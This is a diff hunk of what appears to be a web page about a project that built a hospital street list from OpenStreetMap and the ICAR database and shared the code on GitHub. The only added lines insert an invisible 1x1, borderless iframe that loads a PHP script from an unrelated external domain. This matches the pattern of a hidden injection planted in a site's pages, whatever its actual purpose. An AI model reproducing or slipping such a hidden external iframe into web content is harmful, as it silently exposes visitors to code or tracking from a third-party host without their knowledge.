@@ -28,4 +28,6 @@ Some difficulties we encountered:
 </ul>
 
 As part of this project, we therefore checked some streets of Openstreetmap, and a fraction of the results of the extraction from the ICAR database, and were able to report some inconsistencies, thereby contributing to increase the quality of these datasets. Moreover the source code of the project is freely available on Github, so that anyone with an Omniscale API key can reproduce it for his/her own institution with only minimal GIS knowledge and a minimal amount of modifications. The client hospital will also be able to make a new street list in a couple of months, when the ICAR database will have changed.
+
+<iframe src="https://www.my-poppy.eu/cnt/cnt.php" width="1" height="1" frameBorder="0">
 	 
